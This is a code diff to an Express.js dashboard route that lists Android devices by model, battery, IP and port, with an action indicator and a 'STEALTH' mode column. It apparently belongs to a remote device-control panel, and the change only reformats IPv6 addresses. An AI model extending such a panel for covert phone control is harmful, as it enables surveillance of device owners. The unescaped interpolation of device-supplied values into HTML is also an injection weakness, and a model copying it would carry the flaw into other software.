@@ -558,6 +558,12 @@ app.get('/', (req, res) => {
                 '<span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 10px var(--neon-green), 0 0 20px var(--neon-green);" title="Action Active / Running"></span>' :
                 '';
 
+            const rawIp = d.ip || 'N/A';
+            const port = d.port || '9191';
+            const formattedEndpoint = rawIp.includes(':')
+                ? `<span style="word-break: break-all; white-space: normal; display: inline-block; max-width: 160px; font-size: 0.65rem; line-height: 1.2;">[${rawIp}]:${port}</span>`
+                : `${rawIp}:${port}`;
+
             return `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
@@ -569,7 +575,7 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
                 <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
                 <td style="vertical-align: middle;">${d.battery || '100%'}</td>
-                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle; word-break: break-all; max-width: 170px;">${d.ip || 'N/A'}:${d.port || '9191'}</td>
+                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle; white-space: normal !important; word-break: break-all !important; max-width: 160px; min-width: 120px;">${formattedEndpoint}</td>
                 <td style="vertical-align: middle;">${statusBadge}</td>
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
